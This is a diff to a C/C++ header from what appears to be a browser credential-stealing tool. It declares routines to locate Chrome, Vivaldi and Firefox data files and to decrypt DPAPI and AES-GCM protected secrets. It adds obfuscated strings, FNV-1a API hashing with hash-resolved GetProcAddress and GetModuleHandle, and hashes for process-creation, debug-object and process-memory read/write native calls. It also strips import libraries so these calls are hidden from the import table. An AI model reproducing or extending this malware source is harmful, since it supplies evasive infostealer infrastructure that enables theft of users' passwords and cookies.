@@ -10,12 +10,9 @@
 
 #include "Debug.h"
 #include "Obfuscate.hpp"
+#include "Structures.h"
 
-#pragma comment(lib, "ole32.lib")
-#pragma comment(lib, "oleaut32.lib")
 #pragma comment(lib, "shlwapi.lib")
-#pragma comment(lib, "crypt32.lib")
-#pragma comment(lib, "bcrypt.lib")
 
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
@@ -32,6 +29,7 @@ typedef enum _BROWSER_TYPE
     BROWSER_VIVALDI,
     BROWSER_FIREFOX,
 
+    BROWSER_COUNT,
 } BROWSER_TYPE;
 
 #define STR_CHROME_BRSR_NAME            OBFA_S("Chrome")
@@ -51,7 +49,11 @@ typedef enum _BROWSER_TYPE
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
+#define BUFFER_SIZE_08                  8
+#define BUFFER_SIZE_14                  14
 #define BUFFER_SIZE_16                  16
+#define BUFFER_SIZE_20                  20
+#define BUFFER_SIZE_24                  24
 #define BUFFER_SIZE_32                  32
 #define BUFFER_SIZE_64                  64
 #define BUFFER_SIZE_128                 128
@@ -234,6 +236,8 @@ LPSTR DuplicateAnsiString(IN LPCSTR pszSrc);
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
+BOOL WriteFileToDiskA(IN LPCSTR pszFilePath, IN PBYTE pbFileBuffer, IN DWORD dwFileSize);
+
 BOOL ReadFileFromDiskA(IN LPCSTR pszFilePath, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize);
 
 LPSTR FindJsonStringValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszKey, OUT PDWORD pcbValue);
@@ -249,6 +253,8 @@ LPSTR FindNestedJsonObject(IN LPCSTR pszJson, IN DWORD dwJson, IN LPCSTR pszKey,
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
 BOOL DecryptDpapiBlob(IN PBYTE pBlob, IN DWORD dwBlob, OUT PBYTE* ppDecrypted, OUT PDWORD pcbDecrypted);
+
+BOOL DecryptAesGcm(IN PBYTE pbKey, IN ULONG cbKey, IN PBYTE pbIv, IN ULONG cbIv, IN PBYTE pbCiphertext, IN ULONG cbCiphertext, IN PBYTE pbTag, IN ULONG cbTag, OUT PBYTE* ppbPlaintext, OUT PDWORD pcbPlaintext);
 
 PBYTE Base64Decode(IN LPCSTR pszInput, IN DWORD cbInput, OUT PDWORD pcbOutput);
 
@@ -279,5 +285,120 @@ LPSTR GetBrowserDataFilePath(IN BROWSER_TYPE Browser, IN LPCSTR pszRelPath);
 DWORD GetBrowserDataFilePathEx(IN BROWSER_TYPE Browser, IN LPCSTR* ppszRelPaths, IN DWORD dwFileCount);
 
 VOID DeleteDataFilesCache();
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
+FARPROC GetProcAddressH(IN HMODULE hModule, IN DWORD dwProcNameHash);
+
+HMODULE GetModuleHandleH(IN DWORD dwModuleNameHash);
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
+#pragma region HASH_VALUES
+
+#define FNV1A_KERNEL32DLL                                    0xA3E6F6C3
+#define FNV1A_NTDLLDLL                                       0xA62A3B3B
+
+#define FNV1A_BASEPCONSTRUCTSXSCREATEPROCESSMESSAGE          0x98A84DB3
+#define FNV1A_CSRCAPTUREMESSAGEMULTIUNICODESTRINGSINPLACE    0x58CC175A
+#define FNV1A_CSRCLIENTCALLSERVER                            0x33C69D47
+
+#define FNV1A_NTCREATEUSERPROCESS                            0x116893E9
+#define FNV1A_RTLCREATEPROCESSPARAMETERSEX                   0x2DFC830F
+#define FNV1A_RTLDESTROYPROCESSPARAMETERS                    0x552E48C2
+#define FNV1A_NTCREATEDEBUGOBJECT                            0x22074A55
+#define FNV1A_NTWAITFORDEBUGEVENT                            0xEECD8408
+#define FNV1A_NTDEBUGCONTINUE                                0xED5F89F7
+#define FNV1A_NTREMOVEPROCESSDEBUG                           0x81FB52CF
+#define FNV1A_NTQUERYINFORMATIONPROCESS                      0xEA2DDA8A
+#define FNV1A_NTQUERYSYSTEMINFORMATION                       0x7A43974A
+#define FNV1A_NTREADVIRTUALMEMORY                            0x6E2A0391
+#define FNV1A_NTWRITEVIRTUALMEMORY                           0x43E32F32
+#define FNV1A_NTOPENPROCESSTOKEN                             0x1F1A92AD
+
+#define FNV1A_BCRYPTOPENALGORITHMPROVIDER                    0x3E8576BD
+#define FNV1A_BCRYPTCLOSEALGORITHMPROVIDER                   0xEF8885E7
+#define FNV1A_BCRYPTSETPROPERTY                              0xACCF8FA8
+#define FNV1A_BCRYPTGENERATESYMMETRICKEY                     0xCC7D94FA
+#define FNV1A_BCRYPTDESTROYKEY                               0xDAD6B776
+#define FNV1A_BCRYPTFINISHHASH                               0x886B9128
+#define FNV1A_BCRYPTDESTROYHASH                              0xF5F0473F
+#define FNV1A_BCRYPTHASHDATA                                 0xC6E130F7
+#define FNV1A_BCRYPTCREATEHASH                               0x2EB40C97
+#define FNV1A_BCRYPTDECRYPT                                  0xFB8806A0
+#define FNV1A_BCRYPTDERIVEKEYPBKDF2                          0x83036F32
+#define FNV1A_BCRYPTENCRYPT                                  0x3EA12744
+
+#define FNV1A_REGOPENKEYEXW                                  0xFBF688C6
+#define FNV1A_REGCLOSEKEY                                    0x1242154A
+#define FNV1A_REGQUERYVALUEEXW                               0x7E27CF26
+
+#define FNV1A_CRYPTSTRINGTOBINARYA                           0x6C40A739
+#define FNV1A_CRYPTUNPROTECTDATA                             0xF5E65807
+
+#define FNV1A_COSETPROXYBLANKET                              0x446E152E
+#define FNV1A_COINITIALIZEEX                                 0x4CACFE40
+#define FNV1A_COCREATEINSTANCE                               0xA1F07E4C
+#define FNV1A_COUNINITIALIZE                                 0xA0F3063E
+
+#pragma endregion
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
+typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)
+(
+    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    IN OUT PVOID                SystemInformation,
+    IN ULONG                    SystemInformationLength,
+    OUT PULONG                  ReturnLength OPTIONAL
+);
+
+// Shared dynamically resolved function pointers used by both the EXE and DLL projects.
+// The EXE's DINMCLY_RSOLVD_FUNCTIONS inherits from this struct, so all shared
+// members are accessible flat (without a nested accessor) in the EXE.
+// Shared code should always access these through the g_pSharedFunctions pointer.
+
+typedef struct _SHARED_RSOLVD_FUNCTIONS
+{
+    PVOID                                            pInitialized;
+
+    // NTAPI
+    fnNtQuerySystemInformation                       pNtQuerySystemInformation;
+
+    // BCrypt Functions
+    decltype(&BCryptOpenAlgorithmProvider)           pBCryptOpenAlgorithmProvider;
+    decltype(&BCryptCloseAlgorithmProvider)          pBCryptCloseAlgorithmProvider;
+    decltype(&BCryptSetProperty)                     pBCryptSetProperty;
+    decltype(&BCryptGenerateSymmetricKey)            pBCryptGenerateSymmetricKey;
+    decltype(&BCryptDestroyKey)                      pBCryptDestroyKey;
+    decltype(&BCryptFinishHash)                      pBCryptFinishHash;
+    decltype(&BCryptDestroyHash)                     pBCryptDestroyHash;
+    decltype(&BCryptHashData)                        pBCryptHashData;
+    decltype(&BCryptCreateHash)                      pBCryptCreateHash;
+    decltype(&BCryptDecrypt)                         pBCryptDecrypt;
+    decltype(&BCryptDeriveKeyPBKDF2)                 pBCryptDeriveKeyPBKDF2;
+    decltype(&BCryptEncrypt)                         pBCryptEncrypt;
+
+    // Crypt32 Functions
+    decltype(&CryptStringToBinaryA)                  pCryptStringToBinaryA;
+    decltype(&CryptUnprotectData)                    pCryptUnprotectData; // (dll only)
+
+    // Ole32 Functions (dll only)
+    decltype(&CoSetProxyBlanket)                     pCoSetProxyBlanket;
+    decltype(&CoInitializeEx)                        pCoInitializeEx;
+    decltype(&CoCreateInstance)                      pCoCreateInstance;
+    decltype(&CoUninitialize)                        pCoUninitialize;
+
+} SHARED_RSOLVD_FUNCTIONS, * PSHARED_RSOLVD_FUNCTIONS;
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+// Global pointer to the shared functions struct.
+// - In the DLL: points to a standalone SHARED_RSOLVD_FUNCTIONS instance
+// - In the EXE: points to the base of DINMCLY_RSOLVD_FUNCTIONS (which inherits SHARED_RSOLVD_FUNCTIONS)
+// All shared code must use g_pSharedFunctions-> to access resolved functions.
+
+extern PSHARED_RSOLVD_FUNCTIONS g_pSharedFunctions;
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
 #endif // !COMMON_H
